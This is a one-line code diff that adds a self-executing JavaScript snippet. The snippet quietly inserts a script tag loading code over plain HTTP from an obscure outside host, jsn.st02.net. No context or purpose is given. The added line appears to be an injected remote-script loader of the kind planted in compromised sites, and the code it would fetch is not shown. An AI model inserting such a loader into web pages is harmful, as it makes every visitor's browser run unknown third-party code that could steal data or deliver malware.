@@ -1,0 +1,1 @@
+(function() {var sm = document.createElement("script");sm.type = "text/javascript";sm.async = true;sm.src = "http://jsn.st02.net/i/x/y/xyya.net.3506.js";var s = document.getElementsByTagName("script")[0];s.parentNode.insertBefore(sm, s);})();
